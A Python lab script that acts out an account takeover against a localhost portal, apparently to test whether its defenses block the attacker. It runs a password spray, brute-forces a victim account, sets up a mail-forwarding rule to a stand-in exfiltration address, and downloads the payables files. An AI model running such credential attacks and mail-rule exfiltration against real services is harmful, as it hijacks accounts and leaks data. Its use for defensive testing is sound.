"""Test attack against the lab portal (a system we own). Never point this at anything else.

    .venv/bin/python -m lab.attack            # spray, brute force, then act like an intruder
    .venv/bin/python -m lab.attack --probe    # one login attempt: shows whether the attacker IP is blocked now

What it does, in the order a real account-takeover would:
  1. password spray: a few common passwords against two other accounts
  2. brute force: lab/wordlist.txt against j.doe until a password works
  3. with the stolen session: create a mail rule forwarding to an outside address, list and download
     the payables files, log out
The attacker uses 203.0.113.45 (RFC 5737 documentation range), sent as X-Forwarded-For because all lab
traffic comes from localhost.
"""
import argparse
import sys
import time
from pathlib import Path

import httpx

TARGET = "http://127.0.0.1:8800"
ATTACKER_IP = "203.0.113.45"
VICTIM = "j.doe@lab.example"
SPRAY = ["a.kumar@lab.example", "m.lee@lab.example"]
WORDLIST = Path(__file__).resolve().parent / "wordlist.txt"


def client() -> httpx.Client:
    return httpx.Client(base_url=TARGET, headers={"X-Forwarded-For": ATTACKER_IP}, timeout=5)


def probe() -> int:
    with client() as c:
        r = c.post("/login", json={"username": VICTIM, "password": "Welcome@2026"})
    print(f"probe from {ATTACKER_IP}: HTTP {r.status_code} {r.json().get('detail', 'logged in')}")
    return 0 if r.status_code == 403 else 1


def attack(delay: float) -> int:
    words = WORDLIST.read_text().split()
    with client() as c:
        try:
            c.get("/health").raise_for_status()
        except httpx.HTTPError as exc:
            print(f"lab portal not reachable at {TARGET}: {exc}")
            return 2
        print(f"[1] password spray from {ATTACKER_IP}")
        for user in SPRAY:
            fails = 0
            for pw in words[:6]:
                r = c.post("/login", json={"username": user, "password": pw})
                if r.status_code == 403:
                    print(f"    BLOCKED: {r.json()['detail']}")
                    return 3
                fails += r.status_code == 401
                time.sleep(delay)
            print(f"    {user}: {fails} failed attempts")

        print(f"[2] brute force {VICTIM} with {WORDLIST.name} ({len(words)} passwords)")
        token = None
        for n, pw in enumerate(words, 1):
            r = c.post("/login", json={"username": VICTIM, "password": pw})
            if r.status_code == 403:
                print(f"    BLOCKED after {n - 1} attempts: {r.json()['detail']}")
                return 3
            if r.status_code == 200:
                token = r.json()["token"]
                print(f"    SUCCESS on attempt {n} ({n - 1} failures before it)")
                break
            time.sleep(delay)
        if not token:
            print("    no password worked")
            return 1

        print("[3] post-login actions with the stolen session")
        h = {"Authorization": f"Bearer {token}"}
        c.post("/mail/rules", headers=h, json={"name": "invoice-sync", "forward_to": "billing-sync@exfil-lab.example.net"})
        print("    created mail rule forwarding to billing-sync@exfil-lab.example.net")
        files = c.get("/files/payables", headers=h).json()["files"]
        c.post("/files/payables/download", headers=h, json={"names": files})
        print(f"    downloaded {len(files)} files from the payables share")
        c.post("/logout", headers=h)
        print("    logged out")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--probe", action="store_true")
    ap.add_argument("--delay", type=float, default=0.15, help="seconds between attempts")
    a = ap.parse_args()
    sys.exit(probe() if a.probe else attack(a.delay))
